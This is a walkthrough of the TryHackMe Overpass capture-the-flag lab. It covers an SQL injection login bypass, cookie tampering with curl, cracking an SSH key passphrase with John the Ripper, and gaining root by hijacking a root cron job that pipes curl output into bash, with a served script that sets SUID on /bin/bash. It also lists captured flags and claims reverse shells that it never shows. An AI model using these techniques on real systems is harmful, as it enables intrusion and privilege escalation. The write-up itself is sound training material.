![5](https://github.com/user-attachments/assets/487b0d7a-dc03-410f-b87a-c0197ea38fcc)
![4](https://github.com/user-attachments/assets/dba2eb65-bee6-41b1-bbae-635bc62b6fd4)
![3](https://github.com/user-attachments/assets/846b78e8-07fd-4cc7-bbcf-46d0dbe7db40)
![2](https://github.com/user-attachments/assets/051d2cdf-d3f9-47f8-849f-af509e194fd5)
![1](https://github.com/user-attachments/assets/0f2d046c-e9a7-4146-aaae-c30856ae2e27)
# Overpass CTF Walkthrough

**Author**: Jason Santiago | Date: 10-15-2024

## Introduction
This write-up details the steps taken during the **Overpass CTF** challenge on TryHackMe. The challenge covers web exploitation, privilege escalation via cron jobs, and using reverse shells to gain root access on a target machine.

---

## Reconnaissance

### 1. **Directory Enumeration with Gobuster**

We began with directory enumeration using **Gobuster** to uncover hidden paths on the target web server.

```bash
gobuster dir -u http://10.10.240.73 -w /home/kali/try-hack-me/Overpass/directory-list-2.3-medium.txt
```

After restarting the box, the IP changed to 10.10.234.199.  
Discovered the `/admin/` page.

---

### 2. **Accessing the Admin Page**

Navigating to `http://10.10.234.199/admin/`, we found a login page. Several SQL injection attempts were used to bypass authentication.

**Payload 1**:
```sql
' OR 1=1-- 
```

This bypasses authentication by making the query always true.

---

### 3. **SQLmap for Automated Injection**

**SQLmap** was used to automatically identify injection points:

```bash
sqlmap -u http://10.10.234.199/admin/
```

---

### 4. **Cookie Manipulation with Curl**

We used **Developer Tools (F12)** to inspect how the server handled cookies. By modifying the **SessionToken** cookie, we were able to bypass restrictions on the admin page:

```bash
curl http://10.10.234.199/admin/ --cookie "SessionToken=anything"
```

This granted access to a page that revealed an RSA Private Key.

---

## Privilege Escalation

### 5. **Extracting and Cracking the RSA Private Key**

We downloaded the RSA private key from the admin page and used **John the Ripper** to crack it.

**Convert the RSA key into a format readable by John**:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > forjohn.txt
```

**Crack the passphrase using rockyou.txt**:

```bash
john --wordlist=/home/kali/wordlist/rockyou.txt forjohn.txt
```

Passphrase: `james13`

---

### 6. **SSH Access**

Once the passphrase was cracked, we used the decrypted RSA key to log into the target machine:

```bash
ssh -i id_rsa james@10.10.43.48
```

Enter the passphrase: `james13`

---

### 7. **User Flag**

After gaining SSH access, we retrieved the user flag:

```bash
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
```

---

### 8. **Cron Job Exploitation**

We discovered a cron job that attempts to retrieve and execute a script from **overpass.thm**. By modifying the `/etc/hosts` file, we set up a simple HTTP server to serve the `buildscript.sh` from our Kali machine.

**Cron job content**:
```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

---

### 9. **Setting up the HTTP Server on Kali**

We started a Python HTTP server from the parent directory containing `buildscript.sh`:

```bash
cd ~/try-hack-me/Overpass/cron-hack/
sudo python3 -m http.server 80
```

This allowed the cron job on the target machine to pull the script.

---

### 10. **Crafting the Payload in buildscript.sh**

The payload in `buildscript.sh` was designed to set the SUID bit on `/bin/bash`:

```bash
#!/bin/bash
chmod +s /bin/bash
```

This allows us to escalate privileges and gain root access by running `/bin/bash` with elevated permissions.

---

## Root Access

### 11. **Gaining Root Privileges**

After the cron job executed the payload, we logged back into the machine and checked the SUID bit on `/bin/bash`. Once confirmed, we ran the following command to gain root access:

```bash
/bin/bash -p
```

**Retrieved the root flag**:
```bash
bash-4.4# cat root.txt 
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

---

## Conclusion

The Overpass CTF provided hands-on experience in:

- Web exploitation (SQL injection and cookie manipulation).
- Privilege escalation using cron jobs.
- Utilizing reverse shells for remote access.

By carefully inspecting web vulnerabilities, leveraging tools like **John the Ripper**, and using cron jobs for privilege escalation, we successfully completed the challenge.

---

### Tools Used:

- **Gobuster** for directory brute-forcing.
- **SQLMap** for automated SQL injection.
- **Curl** for web request manipulation and cookie handling.
- **John the Ripper** for password cracking.
- **Netcat** for reverse shell handling.
- **Python HTTP server** for file hosting.
